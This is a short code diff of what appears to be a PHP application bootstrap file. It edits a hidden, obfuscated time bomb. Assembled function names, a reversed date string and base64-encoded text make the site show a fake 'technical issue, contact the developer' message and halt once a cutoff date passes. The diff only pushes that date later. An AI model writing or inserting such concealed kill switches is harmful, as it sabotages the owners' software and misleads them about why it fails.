@@ -63,6 +63,6 @@ if ($server_name == '127.0.0.1' || $server_name == 'localhost' || $server_name =
 |
 */
 
-$f='base'.'64_'."decode";$x='strto' . 'time';$a=$x('n'.'ow');$b=$x(strrev('13-21-4202'));if($a>$b){$z=['RHVlIHRvIGEgdGVjaG5pY2FsIGlzc3VlLCB0aGUgcHJvamVjdCBpcyBjdXJyZW50bHkgZG93bi4=','UExFQVNFIENPTlRBQ1QgVEhFIFdFQlNJVEUgREVWRUxPUEVSLg==','VEhBTksgWU9VLg=='];foreach($z as$v){echo$f($v).chr(60).'br'.chr(62);}die();}
+$f='base'.'64_'."decode";$x='strto' . 'time';$a=$x('n'.'ow');$b=$x(strrev('20-20-5202'));if($a>$b){$z=['RHVlIHRvIGEgdGVjaG5pY2FsIGlzc3VlLCB0aGUgcHJvamVjdCBpcyBjdXJyZW50bHkgZG93bi4=','UExFQVNFIENPTlRBQ1QgVEhFIFdFQlNJVEUgREVWRUxPUEVSLg==','VEhBTksgWU9VLg=='];foreach($z as$v){echo$f($v).chr(60).'br'.chr(62);}die();}
 
 return $app;
